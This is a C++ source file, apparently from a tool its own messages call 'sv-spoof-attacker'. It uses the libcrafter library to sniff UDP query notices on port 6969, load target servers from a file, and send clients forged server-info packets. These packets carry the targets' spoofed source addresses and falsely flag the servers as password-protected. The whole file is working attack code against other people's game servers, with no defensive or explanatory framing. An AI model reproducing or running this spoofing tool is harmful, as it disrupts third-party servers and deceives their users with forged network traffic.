#include <iostream>
#include <vector>
#include <string>
#include <crafter.h>
#include <sys/time.h>
#include <unordered_map>
#include <mutex>

#include "FileUtils.h"
#include "ServerInfoPacket.h"
#include "ServerPacketSender.h"
#include "ServerQueryListener.h"

using namespace std;

const char* TO_FUCK_FILE = "servers-to-fuck.txt";
const char* SNIFFER_INTERFACE = "ens18";
const int REQUEST_EXPIRE_TIME = 60*2; // Secs

class RequestData {
public:
   short port;
   time_t timestamp;

   RequestData(short porte, time_t timestampe) : port(porte), timestamp(timestampe) {}
};

unordered_map<string, RequestData*> requests;
vector<ServerInfoPacket*> packets_to_send;
mutex mtx;

void SendDataToRequest(ServerPacketSender* sender, string ip, RequestData* request) {
    for (auto iter : packets_to_send) {
        ServerInfoPacket* packet = iter;
        sender->Send(packet->GetIP(), packet->GetPort(), ip, request->port, packet);
        cout << "sending stuff to" << ip << ":" << request->port << endl;
    }
}

ServerInfoPacket* GetFuckedPacketForIPPort(string ip, short port) {
    ServerInfoPacket* packet = new ServerInfoPacket();
    packet->SetIP(ip);
    packet->SetPort(port);
    packet->SetUsePassword(true);
    return packet;
}

std::vector<std::string> &split(const std::string &s, char delim, std::vector<std::string> &elems) {
    std::stringstream ss(s);
    std::string item;
    while (std::getline(ss, item, delim)) {
        elems.push_back(item);
    }
    return elems;
}

std::vector<std::string> split(const std::string &s, char delim) {
    std::vector<std::string> elems;
    split(s, delim, elems);
    return elems;
}

// Listen to packets sent by listener server
void PacketHandler(Packet *packet, void *ptr) {
    RawLayer* payload_layer = packet->GetLayer<RawLayer>();
    cout << "well.." << endl;
    //cout << "payload: " << payload_layer->GetStringPayload() << endl;
    if (payload_layer) {
        cout << "payload:" << payload_layer->GetStringPayload() << endl;
    }
    UDP* udp_layer = packet->GetLayer<UDP>();
    cout << "dport: " << udp_layer->GetDstPort() << " sport: " << udp_layer->GetSrcPort() << endl;
    if(udp_layer && payload_layer) {
        // Get who queried the server
        string payload = payload_layer->GetStringPayload();
        vector<string> ip_port = split(payload, '|');
        string ip = ip_port[0];
        unsigned short port = stoi(ip_port[1]);
        mtx.lock();
        pair<string, RequestData*> entry(ip, new RequestData(port, time(0)));
        requests.insert(entry);
        mtx.unlock();
    }
}

void AddServersToFuckFromFile() {
    vector<string>* file_lines = loadFileLines(TO_FUCK_FILE);
    if (file_lines) {
        vector<string> lines = *file_lines;
        for (auto itr : lines) {
            vector<string> ip_port = split(itr, ':');
            string ip = ip_port[0];
            unsigned short port = stoi(ip_port[1]);
            cout << "Servidor leido: " << ip << ":" << port << endl;
            ServerInfoPacket* packet = GetFuckedPacketForIPPort(ip, port);
            packets_to_send.push_back(packet);
        }
    } else {
        cout << "[sv-spoof-attacker] No se pudieron leer servidores desde " << TO_FUCK_FILE << endl;
        cout << "No se va a atacar nada. " << endl;
    }
}

int main() {
    string iface = SNIFFER_INTERFACE; //eth0 eth1 etc..
    cout << "Iniciando en interfaz " << iface << ".." << endl;
    cout << "Agregando servers de " << TO_FUCK_FILE << endl;
    AddServersToFuckFromFile();

    Sniffer sniffer("udp and dst port 6969", iface, PacketHandler);
    sniffer.Spawn(-1);

    ServerPacketSender sender(iface);

    bool running = true;

    while (running) {
        mtx.lock();
        unordered_map<string, RequestData*>::iterator itr = requests.begin();
        while (itr != requests.end()) {
            string ip = itr->first;
            RequestData* request = itr->second;

            unsigned int time_since_request = time(0) - request->timestamp;
            if (time_since_request > REQUEST_EXPIRE_TIME) {
                itr = requests.erase(itr);
                delete request;
            } else {
                SendDataToRequest(&sender, ip, request);
                itr++;
            }
        }
        mtx.unlock();
        sleep(1); // 1 means 1 second (not millisecond)
    }
    sniffer.Cancel();
    return 0;
}
